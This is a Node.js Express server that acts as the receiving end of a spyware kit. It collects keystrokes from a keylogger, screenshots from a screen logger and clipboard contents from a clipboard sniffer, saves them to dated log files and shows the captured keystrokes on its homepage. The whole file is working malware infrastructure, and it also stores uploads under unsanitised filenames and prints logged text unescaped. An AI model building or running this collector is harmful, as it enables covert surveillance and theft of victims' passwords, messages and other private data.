const fs = require("fs");
const express = require("express");
const bodyParser = require("body-parser");
const multer = require("multer");
const path = require("path");

const app = express();
const port = 8080;

// === Middleware ===
app.use(bodyParser.json());

// === Screenshot Upload Setup ===
const storage = multer.diskStorage({
  destination: function (req, file, cb) {
    const dir = "./extracted_screenshot";
    if (!fs.existsSync(dir)) fs.mkdirSync(dir);
    cb(null, dir);
  },
  filename: function (req, file, cb) {
    cb(null, file.originalname);
  }
});
const upload = multer({ storage: storage });

// === Routes ===

// Homepage - View keylogger logs
app.get("/", (req, res) => {
  const logDate = new Date().toISOString().split("T")[0]; 
  const logFilename = `keyboard_capture${logDate}.txt`;

  try {
    const kl_file = fs.readFileSync(`./${logFilename}`, "utf8");
    res.send(`<h1>Data Collected:</h1><p>${kl_file.replace(/\n/g, "<br>")}</p>`);
  } catch {
    res.send("<h1>Nothing logged yet.</h1>");
  }
});

// POST from Keylogger
app.post("/", (req, res) => {
  const time = req.body.timestamp || "Unknown Time";
  const data = req.body.keyboardData || "";

  const logDate = new Date(). toISOString().split("T")[0];
  const logFilename = `keyboard_capture${logDate}.txt`;

  console.log(`[KEYLOG] ${time} - ${data}`);
  fs.appendFileSync(logFilename, `${time} - ${data}\n`)
  res.send("Keyboard data received.");
});

// POST from ScreenshotLogger
app.post("/upload", upload.single("screenshot"), (req, res) => {
  if (!req.file) {
    console.log("[SCREENSHOT] No file uploaded");
    return res.status(400).send("No file uploaded.");
  }
  console.log(`[SCREENSHOT] Received file: ${req.file.filename}`);
  res.send("Screenshot uploaded successfully.");
});

// POST from Clipboard Sniffer
app.post("/clipboard", (req, res) => {
  const time = req.body.timestamp || "Unknown Time";
  const data = req.body.clipboardData || "";

  const logDate = new Date().toISOString().split("T")[0];
  const logFilename = `clipboard_capture_${logDate}.txt`;

  console.log(`[CLIPBOARD] ${time} - ${data}`);
  fs.appendFileSync(logFilename, `${time} - ${data}\n`);

  res.send("Clipboard data received.");
});

// === Start Server ===
app.listen(port, "0.0.0.0", () => {
  console.log(`✅ Server running at http://localhost:${port}`);
})
